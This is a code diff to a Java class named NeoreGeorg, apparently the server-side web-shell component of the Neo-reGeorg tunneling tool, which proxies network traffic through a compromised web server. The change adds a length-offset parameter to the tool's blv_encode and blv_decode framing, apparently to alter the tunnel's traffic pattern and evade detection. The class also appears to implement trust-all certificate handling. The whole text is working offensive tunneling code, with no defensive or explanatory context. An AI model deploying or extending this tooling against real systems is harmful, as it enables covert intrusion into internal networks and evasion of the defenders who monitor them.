@@ -34,6 +34,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
             int READBUF                  = (Integer) args[5];
             int MAXREADSIZE              = (Integer) args[6];
             String GeorgHello            = (String)  args[7];
+            int BLV_L_OFFSET             = (Integer) args[8];
 
             int DATA          = 1;
             int CMD           = 2;
@@ -64,7 +65,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                         inputData += new String(buff);
                     }
                     byte[] data = b64de(inputData);
-                    info = blv_decode(data);
+                    info = blv_decode(data, BLV_L_OFFSET);
                 }
             } catch ( Exception e) {
                 out.write(new String(b64de(GeorgHello)));
@@ -114,7 +115,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                             return false;
                         }
 
-                        String newData = b64en(blv_encode(info));
+                        String newData = b64en(blv_encode(info, BLV_L_OFFSET));
                         byte[] data = newData.getBytes();
                         output.write(data, 0, data.length);
                         output.flush();
@@ -230,7 +231,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                         socketChannel.socket().close();
                     }
                 }
-                out.write(b64en(blv_encode(rinfo)));
+                out.write(b64en(blv_encode(rinfo, BLV_L_OFFSET)));
                 out.flush();
                 out.close();
             } else {
@@ -352,7 +353,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
     }
 
 
-    public static Object[] blv_decode(byte[] data) {
+    public static Object[] blv_decode(byte[] data, Integer offset) {
         Object[] info = new Object[40];
 
         int i = 0;
@@ -365,7 +366,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
         while ( i < data_len ) {
             b = dataInput.read();
             dataInput.read(length, 0, length.length);
-            int l = bytesToInt(length);
+            int l = bytesToInt(length) - offset;
             byte[] v = new byte[l];
             dataInput.read(v,0,v.length);
             i += ( 5 + l );
@@ -381,7 +382,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
     }
 
 
-    public static byte[] blv_encode(Object[] info) {
+    public static byte[] blv_encode(Object[] info, Integer offset) {
         info[0]  = randBytes(5, 20);
         info[39] = randBytes(5, 20);
         ByteArrayOutputStream buf = new ByteArrayOutputStream();
@@ -396,7 +397,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                 }
                 buf.write(b);
                 try {
-                    buf.write(intToBytes(v.length));
+                    buf.write(intToBytes(v.length + offset));
                     buf.write(v);
                 }catch(Exception e) {
                 }
